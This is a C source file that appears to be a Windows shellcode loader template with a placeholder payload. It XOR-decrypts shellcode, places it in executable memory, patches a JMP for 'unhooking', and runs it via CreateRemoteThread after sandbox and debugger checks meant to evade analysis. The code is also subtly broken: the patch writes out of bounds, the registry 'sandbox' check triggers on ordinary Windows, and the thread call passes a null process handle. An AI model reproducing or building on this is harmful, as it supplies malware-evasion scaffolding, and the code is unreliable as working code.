#include <windows.h>
#include <stdio.h>
#include <tchar.h>


int main() {
    // Sleep for 5000ms to simulate initial delay
    unsigned char shellcode[] = {0x90, 0x90}; // Example with NOPs, replace with actual shellcode

    Sleep(5000);

    // Decrypt the shellcode using XOR key 'default_key'
    unsigned char default_key[] = "default_key";
    unsigned int i, length;
    length = sizeof(shellcode) / sizeof(shellcode[0]);
    for (i = 0; i < length; i++) {
        shellcode[i] ^= default_key[i % strlen(default_key)];
    }

    // Allocate memory using VirtualAlloc
    LPVOID exec_mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        _tprintf(_T("VirtualAlloc failed with error: %d\n"), GetLastError());
        return 1;
    }

    // Copy the decrypted shellcode to allocated memory
    memcpy(exec_mem, shellcode, sizeof(shellcode));

    // Patch JMP for Unhooking Method (example patch)
    unsigned char jmp_patch[] = {0xE9}; // JMP instruction
    memcpy((LPVOID)((DWORD)exec_mem + 5), jmp_patch, sizeof(jmp_patch));

    // Check for registry sandbox environment (example check)
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        // Sandbox environment detected
        return 1;
    }

    // Check for anti-debugging techniques (example check)
    if (IsDebuggerPresent()) {
        // Debugger detected
        return 1;
    }

    // Create a remote thread to execute the shellcode
    HANDLE hThread = CreateRemoteThread(NULL, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (hThread == NULL) {
        _tprintf(_T("CreateRemoteThread failed with error: %d\n"), GetLastError());
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return 1;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Clean up memory and close handles
    CloseHandle(hThread);
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}